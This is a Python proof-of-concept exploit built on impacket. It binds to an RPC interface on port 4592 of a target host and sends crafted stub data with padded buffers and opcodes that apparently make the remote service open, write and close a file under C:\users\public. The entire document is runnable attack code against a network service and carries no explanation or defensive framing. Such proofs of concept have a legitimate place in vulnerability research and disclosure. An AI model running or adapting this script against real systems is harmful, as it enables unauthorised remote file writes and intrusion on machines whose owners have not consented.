import sys, struct
from impacket import uuid
from impacket.dcerpc.v5 import transport

def call(dce, opcode, stubdata):
  dce.call(opcode, stubdata)
  res = -1
  try:
    res = dce.recv()
  except Exception as e:
    print("Exception encountered..." + str(e))
    sys.exit(1)
  return res

if len(sys.argv) != 2:
  print("Provide only host arg")
  sys.exit(1)

port = 4592
interface = "5d2b62aa-ee0a-4a95-91ae-b064fdb471fc"
version = "1.0" 

host = sys.argv[1]

string_binding = "ncacn_ip_tcp:%s" % host
trans = transport.DCERPCTransportFactory(string_binding)
trans.set_dport(port)

print("Connecting to the target")

dce = trans.get_dce_rpc()
dce.connect()

iid = uuid.uuidtup_to_bin((interface, version))
dce.bind(iid)

print("Getting a handle to the RPC server")
stubdata = struct.pack("<I", 0x02)
res = call(dce, 4, stubdata)
if res == -1:
  print("Something went wrong")
  sys.exit(1)
res = struct.unpack("III", res)

if (len(res) < 3):
  print("Received unexpected length value")
  sys.exit(1)

print("Sending payload")

val = res[2]

#file open
mode_offset = 260
shflag_offset = 280
opcode = 0x2779
buf = b"C:\\users\\public\\test.txt\x00"
buf += b"\x42" * (mode_offset - len(buf))
buf += struct.pack("<L", 0x61) # mode: 0x6277 = wb, 0x6272 = rb, a = 0x61
buf += b"\x42" * (shflag_offset - len(buf))
buf += struct.pack("<L", 0x20)
stubdata = struct.pack("<IIII", val, opcode, len(buf), len(buf))
stubdata += buf
fstream = call(dce, 1, stubdata)
print(''.join('{:02x}'.format(x) for x in fstream))


# file write
opcode = 0x277d
buf = fstream # *stream
buf += struct.pack("<L", 0x1) # size
buf += struct.pack("<L", 0x1000) # nmemb
buf += struct.pack("<L", 0x61616161) # buffer to write
stubdata = struct.pack("<IIII", val, opcode, len(buf), len(buf))
stubdata += buf
res = call(dce, 1, stubdata)
print(res)


# file close
opcode = 0x277b
buf = fstream # *stream
stubdata = struct.pack("<IIII", val, opcode, len(buf), len(buf))
stubdata += buf
res = call(dce, 1, stubdata)
print(res)

print("Done, disconnecting")

dce.disconnect()
